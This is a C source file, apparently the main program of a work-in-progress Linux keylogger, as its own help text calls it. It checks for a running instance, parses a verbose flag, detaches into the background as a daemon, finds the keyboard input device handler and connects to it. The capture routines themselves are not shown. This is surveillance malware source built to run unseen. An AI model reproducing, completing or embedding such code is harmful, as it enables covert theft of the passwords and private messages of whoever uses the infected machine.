#include "../include/daemon.h"
#include"../include/logger.h"
#include<stdio.h>
#include<unistd.h>
#include<syslog.h>
#include<stdlib.h>
#include<string.h>

void cleanup(void) {
    // Remove the PID file
    unlink(PID_FILE);
    syslog(LOG_INFO, "Daemon exiting. Cleaned up PID file.");
}

int main(int argc ,char *argv[]){

    if(is_already_running()){
         printf("Another instance is already running.\n");
         return 1;
    }
    int verbose = 0;
    char device[MAX_SIZE] = "none";
    char handler[MAX_SIZE] = "none";

    for(int i = 0 ; i < argc ; i++){
        if(strcmp(argv[i],"-v") == 0){
            verbose = 1;
        }

        if(strcmp(argv[i],"--h") == 0 || strcmp(argv[i],"--help") == 0){
            printf("A Linux API Keylogger\n");
            printf("WIP :)\n");
            exit(0);
        }
    }

    atexit(cleanup);
    daemonize();
    get_handler(device,handler);
    connect_handler(handler,verbose);
    
    return 0;
}